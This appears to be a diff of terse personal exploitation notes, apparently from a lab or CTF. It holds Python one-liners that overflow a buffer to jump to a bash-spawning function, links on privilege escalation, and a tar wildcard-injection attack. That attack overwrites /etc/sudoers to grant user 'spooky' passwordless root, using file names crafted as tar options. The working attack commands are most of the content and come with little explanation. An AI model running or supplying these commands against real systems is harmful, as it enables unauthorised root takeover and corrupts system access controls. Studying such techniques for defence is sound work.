@@ -10,10 +10,19 @@ https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
 
 0x00400657    1 129          sym.call_bash
 
-python -c "print 'a'*72 + '\x57\x06\x40\x00\x00\x00\x00\x00' "
+python -c "print 'a'*72 + '\x57\x06\x40\x00\x00\x00\x00\x00'"
+python -c "print 'a'*72 + '\xb3\x06\x40\x00\x00\x00\x00\x00'"
 
 https://stackoverflow.com/questions/31478270/spawned-shell-terminates-quickly-after-buffer-overflow
 https://www.reddit.com/r/LiveOverflow/comments/6mu2si/how_to_maintain_a_shellcode_open/
 https://bitvijays.github.io/LFC-BinaryExploitation.html
 
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x57\x06\x40\x00\x00\x00\x00\x00
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+echo 'echo "spooky ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
+echo "" > "--checkpoint-action=exec=sh demo.sh"
+echo "" > --checkpoint=1
